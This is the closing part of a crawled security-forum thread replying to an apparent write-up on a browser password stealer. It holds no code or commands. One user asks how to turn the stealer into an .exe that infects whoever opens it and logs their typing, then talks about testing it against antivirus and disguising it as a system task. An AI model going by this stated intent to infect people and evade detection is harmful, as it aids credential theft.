<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-07T15:26:50Z" class="post-time">
April 7, 2023, 3:26pm
</time>
<meta itemprop="dateModified" content="2023-04-07T15:26:50Z">
<span itemprop="position">8</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Cool, great Content👍</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_9" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Ryan-S"><span itemprop="name">Ryan-S</span></a>
(Ryan Sherman)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-08T23:07:24Z" class="post-time">
April 8, 2023, 11:07pm
</time>
<meta itemprop="dateModified" content="2023-04-08T23:07:24Z">
<span itemprop="position">9</span>
</span>
</div>
<div class="post" itemprop="text">
<p>So is there anyway you can make this Password Steeler into a .exe file? and it be used as such to give the Password-Steeler.exe file to someone and they open it/click it and the malware now infected their P.C.? And will send information back to a log in my P.C. containing whatever they have been typing ETC ETC??? Let me know please and thank you.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_11" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Ryan-S"><span itemprop="name">Ryan-S</span></a>
(Ryan Sherman)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-09T16:10:12Z" class="post-time">
April 9, 2023, 4:10pm
</time>
<meta itemprop="dateModified" content="2023-04-09T16:15:42Z">
<span itemprop="position">11</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Of course not i just like learning about new techniques and like hands on action on learning about new ways to fight the malware and if i can see it and look through it ill be better prepared. and my High$$ VPN i use im sure will give me enough time to Force delete my entire labtop or burn it with gas lol<br>
or self deleting exe</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_12" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/whatsacomputer"><span itemprop="name">whatsacomputer</span></a>
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-11T01:47:13Z" class="post-time">
April 11, 2023, 1:47am
</time>
<meta itemprop="dateModified" content="2023-04-11T01:47:13Z">
<span itemprop="position">12</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Just made an account to say<br>
Good work! Straight forward explanation</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_14" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/Ryan-S"><span itemprop="name">Ryan-S</span></a>
(Ryan Sherman)
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-11T23:28:22Z" class="post-time">
April 11, 2023, 11:28pm
</time>
<meta itemprop="dateModified" content="2023-04-11T23:28:22Z">
<span itemprop="position">14</span>
</span>
</div>
<div class="post" itemprop="text">
<p>I thank you for the advice but i got it down finally it’s only been since halo 2 and halo 3 days using XR bots/booters and Bio bots &amp; the best Unix id say back then anyways. i just needed the refresher in front of me. now ill test on certain Anti-Virus and upgrade as needed then make my approach for ALL THE INTEL IN THE WORLD!!! and if you can manually find where the file is make sure is then malware inside which ill rename a idk some important .cmd task and just have it copied or written inside for window data base</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_17" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/RiskLimit"><span itemprop="name">RiskLimit</span></a>
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-16T10:46:08Z" class="post-time">
April 16, 2023, 10:46am
</time>
<meta itemprop="dateModified" content="2023-04-16T10:46:08Z">
<span itemprop="position">17</span>
</span>
</div>
<div class="post" itemprop="text">
<p>So to sum up, people should use password managers instead of just saving it in a browser. There seems to be too many ways to log cookies or steal passwords.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_18" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/dtv"><span itemprop="name">dtv</span></a>
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-04-24T13:05:07Z" class="post-time">
April 24, 2023, 1:05pm
</time>
<meta itemprop="dateModified" content="2023-04-24T13:05:07Z">
<span itemprop="position">18</span>
</span>
</div>
<div class="post" itemprop="text">
<p>Great writeup, thank you.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="1" />
<span class="post-likes">1 Like</span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
<div id="post_20" itemprop="comment" itemscope itemtype="http://schema.org/Comment" class="topic-body crawler-post">
<div class="crawler-post-meta">
<span class="creator" itemprop="author" itemscope itemtype="http://schema.org/Person">
<a itemprop="url" href="https://0x00sec.org/u/system"><span itemprop="name">system</span></a>
(system)
Closed
</span>
<link itemprop="mainEntityOfPage" href="33571.html">
<span class="crawler-post-infos">
<time itemprop="datePublished" datetime="2023-06-23T19:43:09Z" class="post-time">
June 23, 2023, 7:43pm
</time>
<meta itemprop="dateModified" content="2023-06-23T19:43:09Z">
<span itemprop="position">20</span>
</span>
</div>
<div class="post" itemprop="text">
<p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/LikeAction" />
<meta itemprop="userInteractionCount" content="0" />
<span class="post-likes"></span>
</div>
<div itemprop="interactionStatistic" itemscope itemtype="http://schema.org/InteractionCounter">
<meta itemprop="interactionType" content="http://schema.org/CommentAction" />
<meta itemprop="userInteractionCount" content="0" />
</div>
</div>
</div>
</div>
<footer class="container wrap">
<nav class="crawler-nav">
<ul>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../index.html" itemprop="url">Home </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../categories.html" itemprop="url">Categories </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="https://0x00sec.org/guidelines" itemprop="url">FAQ/Guidelines </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../tos.html" itemprop="url">Terms of Service </a>
</span>
</li>
<li itemscope itemtype="http://schema.org/SiteNavigationElement">
<span itemprop="name">
<a href="../../privacy.html" itemprop="url">Privacy Policy </a>
</span>
</li>
</ul>
</nav>
<p class="powered-by-link">Powered by <a href="https://www.discourse.org">Discourse</a>, best viewed with JavaScript enabled</p>
</footer>
<script src="https://instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
</body>
</html>
